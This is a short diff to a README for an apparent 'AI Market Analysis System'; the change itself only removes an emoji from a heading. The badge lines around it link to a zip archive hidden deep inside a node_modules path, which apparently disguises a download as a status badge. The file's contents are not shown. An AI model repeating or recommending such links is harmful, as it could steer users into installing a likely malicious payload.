@@ -4,7 +4,7 @@
 [![Version](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
 [![Status](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)](http://localhost:8001/status)
 
-## 🚀 Getting Started
+## Getting Started
 
 The AI Market Analysis System helps you track market trends and make informed decisions. This guide shows you how to download and run the software smoothly.
 
